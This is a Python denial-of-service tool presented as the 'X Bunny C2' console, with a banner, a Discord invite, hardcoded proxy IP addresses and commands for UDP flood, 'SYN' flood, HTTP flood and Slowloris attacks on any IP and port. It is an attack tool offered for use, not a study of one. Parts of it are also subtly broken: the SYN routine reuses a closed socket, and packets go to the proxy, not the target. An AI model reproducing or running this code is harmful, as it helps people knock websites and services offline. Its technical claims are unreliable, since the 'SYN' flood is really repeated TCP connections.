import socket
import random
import time
import sys
import os
import threading

def set_title(title):
    if os.name == "nt":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

def udp_flood(target_ip, target_port, duration, proxy):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.settimeout(5)
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            bytes_data = random._urandom(1024)
            udp_socket.sendto(bytes_data, (proxy[0], target_port))
            packets_sent += 1
            print(f"Sent UDP packet to {proxy[0]}:{target_port} [Total packets sent: {packets_sent}]")
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")
    except socket.timeout:
        print("Proxy connection timed out")
    finally:
        udp_socket.close()

def syn_flood(target_ip, target_port, duration, proxy):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock.connect((proxy, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + target_ip.encode() + b"\r\n\r\n")
            sock.close()
            packets_sent += 1
            print(f"Sent SYN packet to {proxy}:{target_port} [Total packets sent: {packets_sent}]")
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")
    except socket.timeout:
        print("Proxy connection timed out")
    finally:
        sock.close()

def http_flood(target_ip, target_port, duration, proxy):
    headers = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((proxy, target_port))
            sock.sendall(headers.encode())
            sock.close()
            packets_sent += 1
            print(f"Sent HTTP packet to {proxy}:{target_port} [Total packets sent: {packets_sent}]")
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")
    except socket.timeout:
        print("Proxy connection timed out")
    finally:
        sock.close()

def slowloris(target_ip, target_port, duration, proxy):
    headers = (
        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    end_time = time.time() + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((proxy, target_port))
            sock.sendall(headers.encode())
            time.sleep(15)
            packets_sent += 1
            print(f"Sent Slowloris packet to {proxy}:{target_port} [Total packets sent: {packets_sent}]")
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")
    except socket.timeout:
        print("Proxy connection timed out")
    finally:
        sock.close()

plane = """\033[35m
                                                                      
 m    m        mmmmm                                       mmm   mmmm 
  #  #         #    # m   m  m mm   m mm   m   m         m"   " "   "#
   ##          #mmmm" #   #  #"  #  #"  #  "m m"         #          m"
  m""m         #    # #   #  #   #  #   #   #m#          #        m"  
 m"  "m        #mmmm" "mm"#  #   #  #   #   "#            "mmm" m#mmmm
                                            m"                        
                                           ""                         



                          Join us Today: https://discord.gg/jM5GC7Zwgu
"""

commands = """
\t udp       <ip> <port> <duration>
\t syn       <ip> <port> <duration>
\t http      <ip> <port> <duration>
\t slowloris <ip> <port> <duration>
"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def main():
    set_title("X Bunny C2")

    for _ in range(50):
        for line in plane.split("\n"):
            print(" " * (_ % (1000 * len(plane.split("\n")[0]))) + line)
        time.sleep(0.05)
        clear()

    clear()
    print("\033[35m" + plane + "\033[0m")

    print(commands)

    proxies = [
        ("72.10.160.91", 31689),
        ("46.253.184.237", 8118),
        ("171.237.237.218", 10003),
    ]

    while True:
        try:
            cmd = input(f"X Bunny C2 > ").split()

            if cmd:
                if cmd[0] in {"help", "?"}:
                    print(commands)
                elif cmd[0] == "clear":
                    clear()
                elif cmd[0] == "udp" and len(cmd) == 4:
                    proxy = random.choice(proxies)
                    threading.Thread(target=udp_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
                elif cmd[0] == "syn" and len(cmd) == 4:
                    proxy = random.choice(proxies)
                    threading.Thread(target=syn_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
                elif cmd[0] == "http" and len(cmd) == 4:
                    proxy = random.choice(proxies)
                    threading.Thread(target=http_flood, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
                elif cmd[0] == "slowloris" and len(cmd) == 4:
                    proxy = random.choice(proxies)
                    threading.Thread(target=slowloris, args=(cmd[1], int(cmd[2]), int(cmd[3]), proxy)).start()
                else:
                    print("Invalid command or incorrect number of arguments")
        except KeyboardInterrupt:
            print("Exiting X Bunny C2...")
            sys.exit(0)
            
if __name__ == "__main__":
    main()